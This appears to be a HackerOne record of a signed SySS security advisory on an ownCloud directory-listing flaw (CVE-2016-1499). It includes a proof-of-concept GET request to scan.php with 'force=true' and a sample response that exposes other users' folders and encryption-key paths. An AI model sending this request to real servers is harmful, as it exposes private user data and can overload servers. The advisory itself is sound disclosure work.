@@ -1,0 +1,197 @@
+ReportLink:https://hackerone.com/reports/110655
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/erlijnvangenuchten
+ReportedTo:ownCloud(owncloud)
+BountyAmount:250.0
+Severity:
+State:Closed
+DateOfDisclosure:14.01.2016 15:23:59
+
+Summary:
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Advisory ID: SYSS-2015-062
+Product: ownCloud
+Manufacturer: ownCloud Inc., Community
+Affected Version(s): ownCloud <= 8.2.1, <= 8.1.4, <= 8.0.9
+Tested Version(s): 8.1.1, 8.1.4
+Vulnerability Type: Information Exposure Through Directory Listing (CWE-548)
+Risk Level: Medium
+Solution Status: Fixed
+Manufacturer Notification: 2015-07-17
+Solution Date: 2015-12-23
+Public Disclosure: 2016-01-05
+CVE Reference: CVE-2016-1499
+Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
+
+
+Overview:
+========
+
+ownCloud is a software suite for creating and using file hosting
+services.
+
+The ownCloud Web site describes the software  as follows (see [1]):
+
+"ownCloud is a self-hosted file sync and share server. It provides access 
+to your data through a web interface, sync clients or WebDAV while 
+providing a platform to view, sync and share across devices easily — all 
+under your control. ownCloud’s open architecture is extensible via a 
+simple but powerful API for applications and plugins and it works with 
+any storage."
+
+
+Vulnerability Details:
+=================
+
+ownCloud is vulnerable to information exposure through directory
+listing. It is possible with a normal user to get information about
+the complete directory structure and included files of all users.
+The 'force' parameter in the script (index.php/apps/files/ajax/scan.php)
+can easily be manipulated, by setting its value to 'true'.
+
+This vulnerability can potentially be used for denial-of-service attacks
+if the selected directory is deep enough, because to index many
+directories requires high computational effort. In addition, sensitive
+information from other users is exposed.
+
+
+Proof of Concept (PoC):
+====================
+
+With the following HTTP GET request, it is possible to see the
+directories of other users.
+
+```
+GET /index.php/apps/files/ajax/scan.php?force=true&dir=&requesttoken=<VALIDREQUESTTOKEN> HTTP/1.1
+Host: [HOST]
+Accept: text/event-stream
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: [REFERER]
+Cookie: [COOKIES]
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+```
+
+Server response (shortened):
+
+event: user
+data: "[ID]"
+
+event: folder
+data: "\/"
+
+event: count
+data: 21
+
+event: count
+data: 42
+
+event: count
+data: 63
+
+event: folder
+data: "\/[ID]"
+
+event: folder
+data: "\/[ID]\/cache"
+
+event: folder
+data: "\/[ID]6\/files"
+
+event: folder
+data: "\/[ID]\/files_encryption"
+
+[...]
+
+event: folder
+data: "\/[ID]\/files_encryption\/keys\/files\/[FILENAME].zip"
+
+event: folder
+data: "\/[ID]\/files_encryption\/keys\/files\/[FILENAME].zip\/OC_DEFAULT_MODULE"
+
+event: folder
+data: "\/[ID]\/files_encryption\/keys\/files\/[FILENAME].pptx"
+
+[...]
+
+
+Solution:
+========
+
+According to information by ownCloud, the described security issue has
+been fixed in software releases:
+– ownCloud 8.2.2
+– ownCloud 8.1.5
+– ownCloud 8.0.10
+
+Please contact the manufacturer for further information or support or 
+visit https://owncloud.org/security/advisory/?id=oc-sa-2016-002.
+
+
+Disclosure Timeline:
+=================
+
+2015-11-17: Vulnerability reported to manufacturer
+2015-12-23: Patch published by manufacturer
+2016-01-05: Public release of security advisory
+
+
+References:
+==========
+
+[1] ownCloud, Web Site
+    https://owncloud.org/
+[2] SySS Security Advisory SYSS-2015-062
+    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-062.txt
+[3] SySS Responsible Disclosure Policy
+    https://www.syss.de/en/news/responsible-disclosure-policy/
+
+
+Credits:
+=======
+
+This security vulnerability was found by Dr. Erlijn van Genuchten of the
+SySS GmbH.
+
+E-Mail: erlijn.vangenuchten@syss.de
+Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
+Key ID: 0xBD96FF2A
+Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
+
+
+Disclaimer:
+=========
+
+The information provided in this security advisory is provided "as is" and 
+without warranty of any kind. Details of this security advisory may be updated 
+in order to provide as accurate information as possible. The latest version of 
+this security advisory is available on the SySS Web site.
+
+
+Copyright:
+=========
+
+Creative Commons - Attribution (by) - Version 3.0
+URL: http://creativecommons.org/licenses/by/3.0/deed.en
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJWlR69AAoJEAylhje9lv8qjHMQAJWT/wIjZTFwkBdQtkLNHXuP
++roCh4sCsEwaykZDFeILIgjpx4cWm9lga2/C/B0fj/UDDQrgInfEi7CmBZ32u/0m
+iXcV250/Yy9+lYasVpHRxKU4ef3b3rkK4Yf3thaMQPO1KP5LvRXyL//I597mv4Co
+e/gVn4CHZASmcj1hq9AQqbXi7t68pe6kjhWYfs1/qNbRd9g8b8o1u+e1bF2E4J+Z
+t4PKOxuNgzZOy7ZmxRLO3dbFVFLLUVG6XxoqVk2fU5l9WUm6cO3d5md7m+zEoo9s
+xLTEsRIzZ/KccPsNMHmPUMNOXsxh71a4BrkA1y4BYjyXn2KrAMLHEWa7H0SeE9yo
+c6QmGf6STdvu8mgt9fCJvN7U3h2pllyq5rJi/MEPHZB4Q6rt1Kk8SNuel+C6zFJK
+/8g8qVbwz3IW3Iluz6n8mVSZfKfHPooOX6C7NcK2tIFXNBWgrIhKVXWVHsZyDUtc
+ZdjqvIg0YxElLBHLei3OTDTmEDV6RLbe5aIhMWMLzuG6kSY4ZXrGQ1BKhh5Z5t4l
+g/2+f/bHSZouZ9a6UCGJWXb1sGofcbfb/9pK7FirIn8M8OI/FyvKfQiVh2gQPZtw
+0/J4pvREv/09r+tIK/VWjz0UR+eZp81qhljZlhEHWD/fPYBgRgXFRHfh7TzeOrVK
+a8dhY20fJ7J+0dPBSoAp
+=gYnI
+-----END PGP SIGNATURE-----
